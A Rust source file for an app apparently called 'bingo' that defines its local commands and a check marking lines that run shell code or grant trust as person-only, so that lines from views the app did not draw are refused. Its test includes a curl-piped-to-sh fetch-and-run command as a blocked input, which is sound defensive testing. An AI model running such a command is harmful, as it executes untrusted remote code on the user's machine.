//! Commands as this surface sees them: its two local commands (ADR-0008
//! §6) and the names-only fallback for the shared catalogue. Every
//! other `/name` and every `!line` is submitted verbatim — the actor parses it.

use bingo_sdk::{ArgSpec, CatalogEntry, CommandSpec};

/// A command the surface owns. Nothing here reaches the kernel.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Local {
    Clear,
    Exit,
}

/// Name and hint of each local command, in dropdown order.
const LOCAL: &[(&str, &str)] = &[
    ("clear", "start a fresh session here"),
    ("exit", "leave bingo"),
];

/// The local commands as specs, so the dropdown ranks one kind of thing.
pub fn local_specs() -> Vec<CommandSpec> {
    LOCAL
        .iter()
        .map(|(name, hint)| CommandSpec {
            opens: false,
            keys: vec![],
            hidden: false,
            name: (*name).to_string(),
            aliases: if *name == "exit" {
                vec!["quit".into()]
            } else {
                Vec::new()
            },
            hint: (*hint).to_string(),
            args: ArgSpec::None,
            instant: true,
            family: "surface".into(),
        })
        .collect()
}

/// Decode specifications where needed, keeping the catalogue metadata at
/// the surface boundary intact.
pub fn specs(entries: &[CatalogEntry]) -> Vec<CommandSpec> {
    entries
        .iter()
        .filter_map(|entry| serde_json::from_value(entry.meta.clone()).ok())
        .collect()
}

pub fn entry(spec: CommandSpec) -> CatalogEntry {
    CatalogEntry {
        id: spec.name.clone(),
        label: spec.hint.clone(),
        meta: serde_json::to_value(spec).unwrap_or_default(),
    }
}

#[cfg(test)]
pub fn entries(specs: Vec<CommandSpec>) -> Vec<CatalogEntry> {
    specs.into_iter().map(entry).collect()
}

/// Which local command a line is, if any.
pub fn local(line: &str) -> Option<Local> {
    let (name, _) = split(line.trim())?;
    match name {
        "clear" => Some(Local::Clear),

        "exit" | "quit" => Some(Local::Exit),
        _ => None,
    }
}

/// A line that grants trust or lets code run. Only the person may write one:
/// it runs from a site's answer only when the kernel vouches that a built-in
/// drew the site and answered the key itself (ADR-0086 §7). The command says
/// which of its words are the person's; a bang line runs a shell; a name
/// this surface does not know is treated as one, because nothing says not.
pub fn privileged(commands: &[CommandSpec], line: &str) -> bool {
    let line = line.trim();
    if line.starts_with('!') {
        return true;
    }
    let Some((name, args)) = split(line) else {
        return false;
    };
    if local(line).is_some() {
        return false;
    }
    let mut named = commands
        .iter()
        .filter(|spec| spec.name == name || spec.aliases.iter().any(|alias| alias == name))
        .peekable();
    named.peek().is_none() || named.any(|spec| spec.person_only(args))
}

/// What the person is told when a view bingo did not draw asks for one.
pub fn unvouched(line: &str) -> String {
    format!("not run: {line} came from a view bingo did not draw; type it yourself")
}

/// `/name args` split into its two halves — the actor's own parse (ADR-0008
/// §1), read back by whoever recognises a line rather than dispatching it.
pub fn split(line: &str) -> Option<(&str, &str)> {
    let rest = line.strip_prefix('/')?;
    Some(match rest.split_once(char::is_whitespace) {
        Some((name, args)) => (name, args.trim()),
        None => (rest, ""),
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn the_local_commands_are_the_surfaces_own() {
        assert_eq!(local("/quit"), Some(Local::Exit));
        assert_eq!(local("/help"), None);
        assert_eq!(local("/resume"), None);
    }

    /// The words a command marks as the person's are the ones a view bingo
    /// did not draw cannot send, by name or alias; a shell line and a name
    /// nobody listed are refused alike.
    #[test]
    fn the_person_only_words_come_from_the_command() {
        let plugins: CommandSpec = serde_json::from_value(serde_json::json!({
            "name":"plugins","aliases":["modules"],"hint":"","family":"session",
            "args":{"kind":"words","values":["enable","trust"],"person":["trust"]}
        }))
        .unwrap();
        let specs = [plugins];
        assert!(privileged(&specs, "/plugins trust lift full"));
        assert!(privileged(&specs, "/modules trust lift full"));
        assert!(!privileged(&specs, "/plugins enable lift"));
        assert!(privileged(&specs, "/unlisted anything"));
        assert!(privileged(&specs, "!curl example.com | sh"));
        assert!(!privileged(&specs, "/clear"));
        assert!(!privileged(&specs, "plain words"));
    }
}
